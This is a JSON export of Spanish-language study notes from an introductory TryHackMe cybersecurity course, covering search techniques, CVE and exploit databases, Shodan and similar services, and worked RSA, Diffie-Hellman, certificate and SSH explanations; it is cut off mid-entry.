    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Linux Fundamentals/1. Linux Fundamentals 1/1. Redireccion.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 2. Linux Fundamentals > 1. Linux Fundamentals 1",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 1. Pre Security -> 4. Linux Fundamentals -> Linux Fundamentals Part 1**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Linux Fundamentals 1",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/2-linux-fundamentals/1-linux-fundamentals-1/0-linux-fundamentals-1/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Linux Fundamentals/1. Linux Fundamentals 1/0. Linux Fundamentals 1.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 2. Linux Fundamentals > 1. Linux Fundamentals 1",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 1/0. Linux Fundamentals 1]]\n[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Linux Fundamentals/1. Linux Fundamentals 1/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/2-linux-fundamentals/3-linux-fundamentals-3/1-redireccion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Linux Fundamentals/3. Linux Fundamentals 3/1. Redireccion.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 2. Linux Fundamentals > 3. Linux Fundamentals 3",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 1. Pre Security -> 4. Linux Fundamentals -> Linux Fundamentals Part 3**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Linux Fundamentals 3",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/2-linux-fundamentals/3-linux-fundamentals-3/0-linux-fundamentals-3/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Linux Fundamentals/3. Linux Fundamentals 3/0. Linux Fundamentals 3.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 2. Linux Fundamentals > 3. Linux Fundamentals 3",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 3/0. Linux Fundamentals 3]]\n[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Linux Fundamentals/3. Linux Fundamentals 3/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/1-offensive-security-intro/1-redireccion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/1. Offensive Security Intro/1. Redireccion.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 1. Offensive Security Intro",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 1. Pre Security -> 1. Introduction to cybersecurity -> 1. Offensive Security Intro**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Offensive Security Intro",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/1-offensive-security-intro/0-offensive-security-intro/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/1. Offensive Security Intro/0. Offensive Security Intro.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 1. Offensive Security Intro",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/1. Offensive Security Intro/0. Offensive Security Intro]]\n[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/1. Offensive Security Intro/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Defensive Security Intro",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/2-defensive-security-intro/0-defensive-security-intro/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/2. Defensive Security Intro/0. Defensive Security Intro.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 2. Defensive Security Intro",
    "content": "[[0. Deffensive Security Intro]]\n[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/2. Defensive Security Intro/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/2-defensive-security-intro/1-redireccion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/2. Defensive Security Intro/1. Redireccion.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 2. Defensive Security Intro",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 1. Pre Security -> 1. Introduction to cybersecurity -> 2. Deffensive Security Intro**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/3-search-skills/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/3. Search Skills/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 3. Search Skills",
    "content": "Una b√∫squeda en Google \"learn cyber security\" obtiene unos 600 millones de resultados. La b√∫squeda \"learn hacking\" m√°s del doble.\n\nEstamos rodeados de informaci√≥n. Pero ¬øqu√© prefieres? ¬øAceptar los primeros pocos resultados que aparezcan o adquirir las habilidades necesarias para encontrar lo que buscas?",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Search Skills",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/3-search-skills/0-search-skills/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/3. Search Skills/0. Search Skills.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 3. Search Skills",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/3. Search Skills/1. Introduction|1. Introduction]]\n[[2. Evaluation of Search Results]]\n[[3. Search Engines]]\n[[4. Specialized Search Engines]]\n[[5. Vulnerabilities and Exploits]]\n[[6. Technical Documentation]]\n[[7. Social Media]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Technical Documentation",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/3-search-skills/6-technical-documentation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/3. Search Skills/6. Technical Documentation.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 3. Search Skills",
    "content": "Una habilidad fundamental es ser capaz de buscar en la documentaci√≥n oficial.\n\n<h2>P√°ginas de Manual de Linux</h2>\nAntes de que Internet funcionara en todos sitios, ¬øc√≥mo pod√≠as conseguir ayuda en un sistema UNIX? La respuesta es mirando el manual: `man`. En todos los sistemas UNIX, se espera de cada comando que este tenga una p√°gina de manual.\n\nPara ver el manual del comando `ip`, podemos escribir `man ip`. Para salir de la p√°gina de manual, presionamos `q`.\n\nSe pueden mirar p√°ginas de manual en cualquier buscador.\n\n------------\n<h2>Microsoft Windows</h2>\nMicrosoft ofrece una [p√°gina](https://learn.microsoft.com/en-us/) de documentaci√≥n t√©cnica para sus productos.\n\n-------------\n<h2>Documentaci√≥n de Producto</h2>\nDe todos los productos populares se espera que tengan una documentaci√≥n bien organizada. Esta ofrece una fuente de informaci√≥n oficial y confiable. Algunos ejemplos son [Snort Official Documentation](https://www.snort.org/documents), [Apache HTTP Server Documentation](https://httpd.apache.org/docs/), [PHP Documentation](https://www.php.net/manual/en/index.php)y [Node.js Documentation](https://nodejs.org/docs/latest/api/)",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Vulnerabilities and Exploits",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/3-search-skills/5-vulnerabilities-and-exploits/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/3. Search Skills/5. Vulnerabilities and Exploits.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 3. Search Skills",
    "content": "<h2>CVE</h2>\n\nPodemos definir Common Vulnerabilities and Exposures (CVE) como un diccionario de vulnerabilidades. Ofrece un identificador estandarizado para las vulnerabilidades. Cada una recibe in ID con este formato: `CVE-2024-29988`.\n\nLa compa√±√≠a MITRE se encarga de mantener el sistema [CVE](https://www.cve.org/).\n\n<h2>Base de Datos de Exploits</h2>\nHay muchas razones por las cuales alguien querr√≠a explotar una app vulnerable. Sobra decir que no debemos hacerlo sin un acuerdo legal de por medio.\n\nUna vez que tenemos permiso podemos necesitar encontrar un c√≥digo explotable. Para ello, una buena opci√≥n es [Exploit Database](https://www.exploit-db.com/).\n\n[GitHub](https://github.com/) tambi√©n puede contener c√≥digo relacionado con CVE's e incluso PoC (Proof of Concept).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Specialized Search Engines",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/3-search-skills/4-specialized-search-engines/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/3. Search Skills/4. Specialized Search Engines.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 3. Search Skills",
    "content": "Estamos familiarizados con los buscadores de Internet pero no tanto con los buscadores especializados. Estos sirven para obtener cierto tipo de resultados.\n\n-------------\n<h2>Shodan</h2>\nEs un buscador para dispositivos conectados a Internet. Te permite buscar por tipos espec√≠ficos y versiones de servidores, sistemas de control industrial y dispositivos IoT. Para ver aquellos servidores que sigan usando una versi√≥n de un servicio concreto podemos buscar, por ejemplo, `apache 2.4.1`.\n\nEn este [enlace](https://www.shodan.io/search/examples) hay ejemplos de queries para el buscador, y [aqu√≠](https://www.shodan.io/) el buscador.\n\n-----------------\n<h2>Censys</h2>\nA primera vista [censys](https://search.censys.io/) parece igual que shodan. Sin embargo, mientras shodan se centra en dispositivos y sistemas conectados a Internet, censys lo hace en hosts, p√°ginas web, certificados y otros activos conectados a Internet.\n\n---------------\n<h2>VirusTotal</h2>\n[VirusTotal](https://www.virustotal.com/gui/home/upload) es un buscador online que ofrece un servicio de escaneo de virus en archivos usando m√∫ltiples motores de b√∫squeda. Permite subir archivos o insertar URL's para comprobar su integridad.\n\n--------------------\n<h2>Have I Been Pwned</h2>\n[Have I been Pwned](https://haveibeenpwned.com/) hace s√≥lo una cosa: comprobar si un email introducido ha aparecido en brechas de seguridad. Aunque normalmente estas contrase√±as no est√°n en texto claro, la mayor√≠a no son tan dif√≠ciles y se pueden rescatar.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Social Media",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/3-search-skills/7-social-media/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/3. Search Skills/7. Social Media.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 3. Search Skills",
    "content": "Hay millones de usuarios registrados en plataformas de redes sociales como Facebook, Twitter o LinkedIn.\n\nDe manera ideal, querr√≠amos poder explorar estas plataformas sin crear una cuenta pero esto limita severamente la experiencia. Para evitar esto podemos usar correos temporales para que no se conecten con nuestro correo verdadero. Una vez explorado, cerramos la cuenta y el email.\n\nEl poder de las redes sociales es que te permite conectar con personas y empresas que te interesen. Adem√°s est√°n llenas de informaci√≥n valiosa para los especialistas en ciberseguridad, ya sea para aprender o para buscar personas.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Evaluation of Search Results",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/3-search-skills/2-evaluation-of-search-results/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/3. Search Skills/2. Evaluation of Search Results.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 3. Search Skills",
    "content": "En Internet todo el mundo puede publicar sus escritos. Puede ser en forma de blogs, art√≠culos o publicaciones en redes sociales. \n\nEs nuestro trabajo como lectores evaluar la informaci√≥n. Algunas cosas que tener en cuenta al evaluarla:\n\n- Fuente: Identifica al autor u organizaci√≥n publicadora de dicha informaci√≥n y considera su reputaci√≥n y autoridad en la materia.\n- Evidencia y razonamiento: Comprueba que lo dicho est√© respaldado por evidencia cre√≠ble y razonamiento l√≥gico.\n- Objetividad y tendencia: Eval√∫a si la informaci√≥n est√° presentada de manera imparcial, reflejando m√∫ltiples perspectivas. O si por el contrario tiene una inclinaci√≥n de alg√∫n tipo.\n- Corroboraci√≥n y consistencia: Valida la informaci√≥n presentada contrastando con m√°s fuentes fiables independientes. Comprueba que varias fuentes con reputaci√≥n y confiables coinciden.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Search Engines",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/3-search-skills/3-search-engines/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/3. Search Skills/3. Search Engines.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 3. Search Skills",
    "content": "Todo el mundo ha usado un buscador, pero no todo el mundo ha intentado llevarlo a su m√°ximo potencial.\n\nVeamos los operadores de b√∫squeda usados por Google:\n\n- `\"frase exacta\"`: Poner una frase entre comillas hace que aparezcan s√≥lo aquellos resultados de b√∫squeda con esa frase exacta.\n- `site:`: Este operador te permite especificar el dominio en el cual quieres buscar.\n- `-`: El s√≠mbolo `-` te permite omitir resultados que contengan una palabra en particular (`pyramids -tourism` √≥ `-tourism pyramids`).\n- `filetipe:`: Te permite buscar por formato de archivo (PDF, DOC, XLS, PPT, por ejemplo: `filetype:ppt cyber security`).\n\n[Aqu√≠](https://github.com/cipher387/Advanced-search-operators-list) una p√°gina web con m√°s operadores para profundizar.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. RSA",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/2-public-key-cryptography-basics/3-rsa/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/3. RSA.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 2. Public Key Cryptography Basics",
    "content": "RSA es un algoritmo de cifrado de llave p√∫blica que permite mandar informaci√≥n de manera segura a trav√©s de canales que no lo son.\n\n----------------\n<h2>Las Matem√°ticas que Hacen Seguro a RSA</h2>\nRSA est√° basado en el problema de factorizar un n√∫mero muy grande. Multiplicar dos n√∫meros primos grandes es una tarea sencilla. Sin embargo, dado el resultado es muy dif√≠cil y costoso encontrar sus factores primos. Consideremos el siguiente ejemplo num√©rico:\n\n- N√∫mero primo 1: 982451653031\n- N√∫mero primo 2: 169743212279\n- Su producto: 982451653031 * 169743212279 = 166764499494295486767649\n\nLa multiplicaci√≥n se hace en un momento, pero intenta buscar los factores primos que lo conforman sin saberlos...\n\nEn la realidad se usan n√∫meros m√°s grandes, ya que un ordenador puede factorizarlo sencillamente, pero no puede hacerlo con un n√∫mero de m√°s de 600 d√≠gitos.\n\n-------------\n<h2>Ejemplo Num√©rico</h2>\nVeamos el algoritmo RSA en acci√≥n:\n\n1. Bob elige 2 n√∫meros primos: *p = 157* y *q = 199*. Calcula *n = p * q = 31243*.\n2. Con la ecuaci√≥n Phi de Euler: *œï(n)‚ÄÑ=‚ÄÑn‚ÄÖ‚àí p‚ÄÖ‚àí‚ÄÖq‚ÄÖ+‚ÄÖ1* sacamos que el n√∫mero es 30888. Bob entonces selecciona un n√∫mero `e` impar, de tal manera que sea coprimo con `œï(n)`. Dos n√∫meros son coprimos si no comparten ning√∫n divisor mayor que 1; 8 y 15 son coprimos pero 14 y 21 no. En este caso *e = 163*. Adem√°s selecciona *d* tal que *(e * d) % œï(n) = 1*. La **clave p√∫blica** es: *(n,e)* y la **clave privada** es: *(n,d)*.\n3. Digamos que el valor que se quiere encriptar es *x = 13*. Alice calcular√≠a y mandar√≠a *y = (x^e) % n*; *y = (13¬π‚Å∂¬≥) % 31243 = 16341*.\n4. Bob recibir√≠a este valor y calcular√≠a *x = (y^d) % n*; *x = (16341¬≥‚Å∑‚Åπ) % 31243 = 13*.\n\nVolvemos a recalcar que en ester ejemplo escogimos n√∫meros primos de tres cifras, pero en la vida real tienen m√°s de 300 d√≠gitos.\n\n--------------\n<h2>RSA en CTFs</h2>\nLa matem√°tica detr√°s de RSA suele aparecer en los CTF (Capture The Flag). Hay herramientas para romper RSA en CTFs como [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) o [rsatool](https://github.com/ius/rsatool).\n\nNecesitas saber las variables para los CTFs:\n\n- p y q son los n√∫meros primos grandes.\n- n es el producto de p y q.\n- La clave publica es n y e.\n- La clave privada es n y d.\n- m se usa para representar el mensaje original (plaintext).\n- c representa el mensaje cifrado (ciphertext).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Digital Signatures and Certificates",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/2-public-key-cryptography-basics/6-digital-signatures-and-certificates/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/6. Digital Signatures and Certificates.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 2. Public Key Cryptography Basics",
    "content": "En el mundo anal√≥gico se te pide firmar un papel de vez en cuando. El prop√≥sito puede variar dependiendo de la situaci√≥n. Puede significar que aceptas unos t√©rminos, autorizas una transacci√≥n o confirmas haber recibido algo. En el mundo digital necesitas una firma digital.\n\n---------------\n<h2>¬øQu√© es una firma digital?</h2>\nLas firmas digitales ofrecen una manera de verificar la autenticidad e integridad de un mensaje o documento digital. Probar la autenticidad de los archivos significa que sabemos qui√©n ha creado o modificado dicho archivo. Usando encriptaci√≥n asim√©trica, podemos producir una firma con nuestra clave privada, que puede ser verificada usando la clave p√∫blica. S√≥lo t√∫ deber√≠as tener acceso a tu clave privada, lo que significa que t√∫ firmaste ese documento. En los pa√≠ses modernos las firmas anal√≥gicas y digitales tienen la misma validez.\n\nLa forma m√°s sencilla de hacer una firma digital es encriptando el documento con tu clave privada. Si alguien quisiera verificar esta firma, desencriptar√≠an el documento usando tu clave p√∫blica.\n\n![[132.jpg]]\n\nAlgunos art√≠culos se refieren a firma electr√≥nica y firma digital indistintamente, pero no son lo mismo. Pegar una foto encima de un documento no es una manera real de comprobar autenticidad porque cualquier persona puede hacerlo.\n\nAqu√≠ usamos firma digital para referirnos a firmar un documento usando claves privadas o certificados.\n\n-----------\n<h2>Certificados: ¬°Prueba qui√©n eres!</h2>\nLos certificados son una aplicaci√≥n esencial de la criptograf√≠a p√∫blica y est√°n vinculados a firmas digitales. Un sitio com√∫n de su uso es HTTPS. ¬øC√≥mo sabe tu navegador que el servidor con el que est√°s hablando es realmente tryhackme.com?\n\nLa respuesta recae en los certificados. El servidor tiene un certificado que acredita que es tryhackme.com. Los certificados son s√≥lo confiados si la CA (Certification Authority) lo corrobora. Es una cadena: El certificado est√° firmado por una organizaci√≥n, la organizaci√≥n es confiada por la CA, la CA es confiada por tu navegador.\n\nDigamos que tenemos una web y queremos usar HTTPS. Necesitaremos un certificado digital TLS. Podemos obtener uno de varias CAs por una cuota anual. Adem√°s puedes conseguir tus propios certificados TLS para tus dominios en propiedad usando [Let's Encrypt](https://letsencrypt.org/) de manera gratuita.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Conclusion",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/2-public-key-cryptography-basics/8-conclusion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/8. Conclusion.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 2. Public Key Cryptography Basics",
    "content": "Hemos definido criptograf√≠a. Otra ciencia importante que estudia el bypasseo de la criptograf√≠a es el criptoan√°lisis. Cuando no sabemos nada, el ataque de fuerza bruta puede ser √∫til, sin embargo en otros escenarios un ataque de diccionario puede funcionar mejor.\n\n- Criptograf√≠a: Ciencia que securiza las comunicaciones usando c√≥digos y cifrados.\n- Criptoan√°lisis: Ciencia que estudia m√©todos de romper los sistemas criptogr√°ficos.\n- Ataque de fuerza bruta: Un m√©todo de ataque basado en prueba de todas las combinaciones posibles.\n- Ataque de diccionario: M√©todo en el que el atacante usa palabras de un diccionario o combinaciones de √©l.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Common Use of Asymetric Encryption",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/2-public-key-cryptography-basics/2-common-use-of-asymetric-encryption/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/2. Common Use of Asymetric Encryption.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 2. Public Key Cryptography Basics",
    "content": "Intercambiar claves de encriptaci√≥n sim√©trica usando claves de encriptaci√≥n asim√©trica es una pr√°ctica bastante com√∫n. La clave asim√©trica es m√°s larga y lenta que la sim√©trica, es por eso que s√≥lo la usamos para decidir una clave sim√©trica.\n\n------------\n<h2>Analog√≠a</h2>\nImagina que tienes un c√≥digo secreto y unas instrucciones para usarlo y se lo quieres mandar a tu amigo. Puedes pedirle a tu amigo una caja con candado de la que s√≥lo √©l tenga la llave. Al llegarle el mensaje a tu amigo puede abrirlo y leer el c√≥digo y las instrucciones.\n\n| Analog√≠a          | Sistema Criptogr√°fico     |\n| ----------------- | ------------------------- |\n| C√≥diugo Secreto   | Cifrado sim√©trico y clave |\n| Cerradura         | Clave p√∫blica             |\n| Llave del Candado | Clave privada             |\n\nEs decir, s√≥lo usaremos las claves privada y p√∫blica una vez para evitar la lentitud.\n\n---------------\n<h2>El Mundo Real</h2>\nEn la realidad, necesitas m√°s que la criptograf√≠a para verificar que la persona con la que est√°s hablando es realmente quien dice ser. Para ello existen las firmas digitales y los certificados, los cuales veremos en esta unidad.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/2-public-key-cryptography-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 2. Public Key Cryptography Basics",
    "content": "Consideremos el siguiente ejemplo. Vas a reunirte con tu compa√±ero de negocios, tu socio, en una cafeter√≠a para discutir detalles relevantes y ciertamente confidenciales. Miremos este ejemplo desde la perspectiva de la seguridad:\n\n- Puedes ver y escuchar a la otra persona f√≠sicamente, por lo que puedes identificarlo. Eso es la **autentificaci√≥n**, confirmar la identidad de con quien est√°s hablando.\n- Tambi√©n puedes asegurar que lo que oyes sale de su boca, eso es **autenticidad**, confirmar que el mensaje recibido proviene del emisor sabido. Adem√°s puedes saber que lo que te dice llega a ti sin cambios, eso es **integridad**.\n- Por √∫ltimo, puedes coger un sitio apartado de otros clientes y hablar en voz baja, de tal forma que s√≥lo os escuch√°is entre vosotros. Eso es **confidencialidad**.\n\nLa criptograf√≠a ofrece soluciones para abordar estos problemas.\n\n-----------\n<h2>Pre-requisitos</h2>\nEsta es la segunda unidad de un grupo de tres sobre la criptograf√≠a:\n\n- [[0. Cryptography Basics]]\n- [[0. Public Key Cryptography Basics]]\n- [[0. Hashing Basics]]\n\n---------------\n<h2>Objetivos de Aprendizaje</h2>\nEn esta unidad cubriremos varios sistemas de encriptaci√≥n asim√©tricos y las aplicaciones que las usan, como:\n\n- RSA.\n- Diffie-Hellman.\n- SSH.\n- Certificados SSL/TLS.\n- PGP y GPG.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Diffie-Hellman Key Exchange",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/2-public-key-cryptography-basics/4-diffie-hellman-key-exchange/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/4. Diffie-Hellman Key Exchange.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 2. Public Key Cryptography Basics",
    "content": "Uno de los retos de usar la encriptaci√≥n sim√©trica es compartir la clave secreta. Lo m√°s c√≥modo para mandarla ser√≠a tener un canal de comunicaci√≥n secreto.\n\n------------\n<h2>Intercambio de Clave Diffie-Hellman</h2>\nEl intercambio de claves tiene como objetivo establecer un secreto compartido entre dos partidos. Es un m√©todo que permite que dos partes establezcan un canal de comunicaci√≥n seguro para compartir secretos sin requerir un secreto compartido previo y sin que un observador pueda obtenerla.\n\nConsideremos el siguiente escenario:\n\nAlice y Bob quieren hablar de forma segura. Quieren establecer una clave para criptograf√≠a sim√©trica pero no quieren usar criptograf√≠a asim√©trica para el intercambio de clave. Aqu√≠ entra en juego Diffie-Hellman.\n\nAlice y Bob generan secretos independientemente, los llamaremos A y B. Tambi√©n tienen algo de material p√∫blico, lo llamaremos C.\n\nNecesitamos hacer ciertas asunciones:\n\n- Cuando combinamos secretos son pr√°cticamente imposibles de separar.\n- El orden en el que se combinen no importa.\n\nAlice y Bob combinar√°n sus secretos con material com√∫n, AC y BC. Se mandar√°n eso el uno al otro y lo combinar√°n con su secreto para crear dos llaves id√©nticas ABC.\n\nPongamos un ejemplo m√°s explicativo:\n\n1. Alice y Bob se ponen de acuerdo en ciertas variables p√∫blicas: un n√∫mero primo grande *p* y uno generador, *g*; donde *0 < g < p*. Elijamos unos peque√±os para el ejemplo: *p = 29* y *g = 3*.\n2. Cada parte elige un n√∫mero entero privado. Como ejemplo num√©rico digamos que Alice elije *a = 13* y Bob elige *b = 15*. Cada uno de estos valores representa una clave privada.\n3. Alice calcula su clave: *A = (g^a) % p = 3¬π¬≥ % 29 = 19*. Bob calcula la suya: *B = (g^b) % p = 3¬π‚Åµ % 29 = 26*. Estas son claves p√∫blicas.\n4. Alice y Bob intercambian las claves. Este proceso se llama intercambio de claves.\n5. Alice y Bob finalmente calculan el secreto compartido usando su  clave privada y p√∫blica. Alice calcula: *(B^a) % p = 26¬π¬≥ % 29 = 10*; Bob calcula: *(A^b) % p = 19¬π‚Åµ % 29 = 10*. Los dos c√°lculos conllevan al mismo resultado: g‚ÅΩab‚Åæ % p = 10, su clave secreta compartida.\n\n![[131.jpg]]\n\nDiffie-Hellman se suele usar junto a RSA para la criptograf√≠a p√∫blica. Diffie-Hellman se usa para el acuerdo, mientras que RSA para las firmas digitales, transporte de claves y autentificaci√≥n. RSA ayuda a identificar la persona con la que hablas. De esta manera se previene a alguien atacando la conexi√≥n con un MITM pretendiendo ser quien no es.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. SSH",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/2-public-key-cryptography-basics/5-ssh/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/5. SSH.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 2. Public Key Cryptography Basics",
    "content": "La interacci√≥n de SSH al iniciar un intento de conexi√≥n confirma si el ordenador reconoce la huella de clave p√∫blica del servidor. El posible recibir un ataque MITM en esta fase porque no hay manera de saber si esa es la clave p√∫blica del servidor al que estamos intentando conectarnos o una conexi√≥n interceptada. Si le das a que s√≠, pr√≥ximamente te conectar√° de manera silenciosa al haber guardado ya la clave.\n\n--------------\n<h2>Autentificando un Cliente</h2>\nUna vez que hemos confirmado que estamos hablando con el servidor correcto, necesitamos identificarnos a nosotros mismos y autentificarnos.\n\nUna manera de realizar esta autentificaci√≥n es con un usuario y contrase√±a, pero no es de las mejores pr√°cticas. Es aqu√≠ donde entra la clave p√∫blica y privada que verifican que un usuario es leg√≠timo en el servidor. Por defecto, las claves SSH son RSA aunque puedes elegir qu√© algoritmo usar para la creaci√≥n de la clave.\n\n`ssh-keygen` es el comando que se suele utilizar para dicho fin. Algunos de los algoritmos son:\n\n- **DSA (Digital Signature Algorithm):** Algoritmo de criptograf√≠a 